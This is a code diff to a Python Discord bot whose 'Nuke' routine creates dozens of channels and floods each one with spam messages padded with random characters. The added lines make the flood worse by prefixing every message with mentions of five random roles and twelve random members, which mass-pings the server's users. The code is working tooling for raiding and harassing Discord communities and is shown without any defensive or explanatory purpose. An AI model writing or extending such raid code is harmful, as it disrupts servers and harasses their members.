@@ -66,6 +66,8 @@ class DiscordBot(discord.Client):
                 await asyncio.gather(*(self.createChannel(channelName, guild) for _ in range(60)))
             self.channels = list(guild.channels)
             random.shuffle(self.channels)
+            roles = self.guild.roles
+            members = self.guild.members
             for _ in range(numberOfExecutions):
                 if self.logId in stops:
                     logs.pop(self.logId)
@@ -74,6 +76,10 @@ class DiscordBot(discord.Client):
                 logs[self.logId] += "--- Nuke ---\n"
                 for channel in self.channels:
                     bMessage = message+"\n"+"".join(random.choice(string.ascii_lowercase) for _ in range(30))
+                    for role in random.sample(roles, 5):
+                        bMessage = f"<@&{role.id}>\n"+bMessage
+                    for member in random.sample(members, 12):
+                        bMessage = f"<@{member.id}>\n"+bMessage
                     await self.sendMessage(bMessage, channel, latency*0.001)
         except:
             logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
